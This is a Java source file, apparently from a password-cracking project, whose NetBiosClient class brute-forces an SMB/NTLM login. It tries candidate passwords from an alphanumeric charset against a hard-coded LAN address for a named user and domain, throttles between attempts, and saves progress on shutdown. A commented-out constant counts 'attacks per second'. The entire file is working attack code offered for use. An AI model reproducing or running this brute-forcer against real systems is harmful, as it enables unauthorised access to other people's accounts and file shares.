package client;

import java.io.File;
import java.net.UnknownHostException;

import jcifs.UniAddress;
import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbAuthException;
import jcifs.smb.SmbException;
import jcifs.smb.SmbSession;
import server.Server;
import server.ServerSerializer;

public class NetBiosClient extends Client {

//	private static final int ATTACCHI_AL_SECONDO = 3;
//	private int durataAttesa = 1000 / ATTACCHI_AL_SECONDO;
	
	public NetBiosClient(Server s) {
		super(s);
	}

	@Override
	public boolean check(String password, byte[] toCrack) {
		try {
			UniAddress address = UniAddress.getByName("192.168.0.51");
			NtlmPasswordAuthentication ntlm = new NtlmPasswordAuthentication("simo01","simona",password);
			SmbSession.logon(address, ntlm);
			return true;
		} catch(SmbAuthException e){
			//password errata
		} catch (SmbException e) {
			e.printStackTrace();
		}
		catch (UnknownHostException e1) {
			e1.printStackTrace();
		}

		try {
			Thread.sleep(500);
		} catch (InterruptedException e) {}
		return false;
	}
	
	public static void main(String[] args) {
		File file = new File("simo01.ser");
		Server s = ServerSerializer.load(file);
		if (s == null){
			s = new Server(new byte[128], "abcdefghijklmnopqrstuvywxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", 1, 10, "MD5");
		}
		Runtime.getRuntime().addShutdownHook(new ServerSerializer(s, file));
		s.setWorkSize(10);
			
		
		NetBiosClient cl = new NetBiosClient(s);
		new Thread(s).start();
		new Thread(cl).start();
	}

}
